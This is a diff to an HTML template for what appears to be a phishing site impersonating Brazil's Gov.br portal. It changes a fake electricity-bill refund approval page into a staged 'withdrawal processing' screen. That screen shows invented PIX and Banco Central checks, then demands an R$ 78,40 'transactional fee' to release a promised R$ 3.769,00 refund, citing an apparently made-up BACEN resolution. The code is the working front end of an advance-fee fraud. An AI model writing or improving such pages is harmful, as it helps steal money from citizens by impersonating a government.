@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gov.br - Análise de Dados</title>
+    <title>Gov.br - Processando Retirada</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -28,13 +28,6 @@
         .loading-step.show {
             opacity: 1;
             transform: translateY(0);
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        .animate-pulse {
-            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
         }
     </style>
     <script>
@@ -76,7 +69,7 @@
                 <div class="w-2 h-2 bg-white"></div>
                 <div class="w-2 h-2 bg-white"></div>
             </div>
-            <span class="text-white text-xl tracking-wide drop-shadow-sm">ANÁLISE DE DADOS</span>
+            <span class="text-white text-xl tracking-wide drop-shadow-sm">PROCESSANDO RETIRADA</span>
         </div>
     </div>
 
@@ -94,70 +87,53 @@
                 <div class="space-y-4">
                     <div class="loading-step">
                         <div class="flex items-center text-gray-600">
-                            <i class="fas fa-database mr-2"></i>
-                            <span>Consultando a Agência Nacional de Energia Elétrica (ANEEL)...</span>
+                            <i class="fas fa-university mr-2"></i>
+                            <span>Iniciando processo de transferência via PIX...</span>
                         </div>
                     </div>
                     <div class="loading-step">
                         <div class="flex items-center text-gray-600">
-                            <i class="fas fa-search mr-2"></i>
-                            <span>Conferindo se teve cobranças indevidas nos dados da Receita Federal...</span>
+                            <i class="fas fa-check-circle mr-2"></i>
+                            <span>Validando dados do beneficiário...</span>
                         </div>
                     </div>
                     <div class="loading-step">
                         <div class="flex items-center text-gray-600">
-                            <i class="fas fa-file-invoice-dollar mr-2"></i>
-                            <span>Verificando histórico de faturamento junto à {{ user_data.companhia.nome }}...</span>
+                            <i class="fas fa-shield-alt mr-2"></i>
+                            <span>Verificando conformidade com normas do Banco Central...</span>
                         </div>
                     </div>
                     <div class="loading-step">
                         <div class="flex items-center text-gray-600">
-                            <i class="fas fa-calculator mr-2"></i>
-                            <span>Calculando valores de restituição conforme resolução normativa...</span>
+                            <i class="fas fa-exclamation-triangle mr-2"></i>
+                            <span>Processando transferência...</span>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <!-- Results Section (Initially Hidden) -->
-            <div id="results-section" class="space-y-6 hidden">
-                <!-- User Info Box -->
+            <!-- Error Section (Initially Hidden) -->
+            <div id="error-section" class="hidden">
                 <div class="bg-white rounded-lg shadow-md p-6">
-                    <h3 class="text-lg font-bold text-gov-blue mb-4">Dados do Solicitante</h3>
-                    <div class="space-y-3">
-                        <div class="border rounded-lg p-3">
-                            <label class="block text-sm font-medium text-gray-600">Nome Completo</label>
-                            <p class="text-gray-900 font-bold">{{ user_data.nome_real }}</p>
+                    <div class="flex flex-col items-center text-center">
+                        <div class="rounded-full bg-red-100 p-3 mb-4">
+                            <i class="fas fa-exclamation-circle text-red-600 text-3xl"></i>
                         </div>
-                        <div class="border rounded-lg p-3">
-                            <label class="block text-sm font-medium text-gray-600">CPF</label>
-                            <p class="text-gray-900 font-bold">{{ '{}.{}.{}-{}'.format(user_data.cpf[:3], user_data.cpf[3:6], user_data.cpf[6:9], user_data.cpf[9:]) }}</p>
+                        <h2 class="text-xl font-bold text-red-600 mb-4">Pagamento da Tarifa Transacional Pendente</h2>
+                        <div class="text-gray-600 space-y-4 mb-6">
+                            <p>
+                                Identificamos que a tarifa transacional obrigatória não foi processada. Esta tarifa é necessária para cobrir os custos operacionais da transferência interbancária de alto valor, conforme regulamentação vigente.
+                            </p>
+                            <p>
+                                Para prosseguir com a retirada da sua restituição no valor de R$ 3.769,00, é necessário regularizar o pagamento da tarifa transacional.
+                            </p>
+                            <div class="bg-gray-50 p-4 rounded-lg">
+                                <p class="font-medium">Valor da Tarifa Transacional: R$ 78,40</p>
+                                <p class="text-sm text-gray-500">Conforme resolução nº 482/2021 do BACEN</p>
+                            </div>
                         </div>
-                        <div class="border rounded-lg p-3">
-                            <label class="block text-sm font-medium text-gray-600">Estado</label>
-                            <p class="text-gray-900 font-bold">{{ user_data.estado }}</p>
-                        </div>
-                        <div class="border rounded-lg p-3">
-                            <label class="block text-sm font-medium text-gray-600">Companhia Elétrica</label>
-                            <p class="text-gray-900 font-bold">{{ user_data.companhia.nome }}</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Approval Box -->
-                <div class="bg-green-50 border-2 border-green-200 rounded-lg p-6">
-                    <div class="flex items-center justify-center mb-4">
-                        <div class="rounded-full bg-green-100 p-3">
-                            <i class="fas fa-check-circle text-green-600 text-3xl"></i>
-                        </div>
-                    </div>
-                    <h2 class="text-2xl font-bold text-center text-green-800 mb-4">Restituição Aprovada!</h2>
-                    <p class="text-green-700 text-center mb-6">
-                        Foi aprovada uma restituição no valor de R$ 3.769,00 para o CPF {{ '{}.{}.{}-{}'.format(user_data.cpf[:3], user_data.cpf[3:6], user_data.cpf[6:9], user_data.cpf[9:]) }}.
-                    </p>
-                    <div class="flex justify-center">
-                        <a href="{{ url_for('retirada_restituicao') }}" class="bg-gov-blue hover:bg-opacity-90 text-white font-bold py-3 px-8 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200">
-                            <span>Sacar Restituição</span>
+                        <a href="{{ url_for('pagamento') }}" class="bg-gov-blue hover:bg-opacity-90 text-white font-bold py-3 px-8 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200">
+                            <span>Pagar Tarifa e Prosseguir</span>
                             <i class="fas fa-arrow-right ml-2"></i>
                         </a>
                     </div>
@@ -179,14 +155,14 @@
             steps.forEach((step, index) => {
                 setTimeout(() => {
                     step.classList.add('show');
-                }, index * 5000); // Show each step with 5s delay
+                }, index * 2000); // Show each step with 2s delay
             });
 
-            // After all steps are shown, wait 5 seconds and show results
+            // After all steps are shown, wait 2 seconds and show error
             setTimeout(() => {
                 document.getElementById('loading-section').style.display = 'none';
-                document.getElementById('results-section').classList.remove('hidden');
-            }, (steps.length * 5000) + 5000);
+                document.getElementById('error-section').classList.remove('hidden');
+            }, (steps.length * 2000) + 2000);
         }
 
         // Start the animation sequence when the page loads
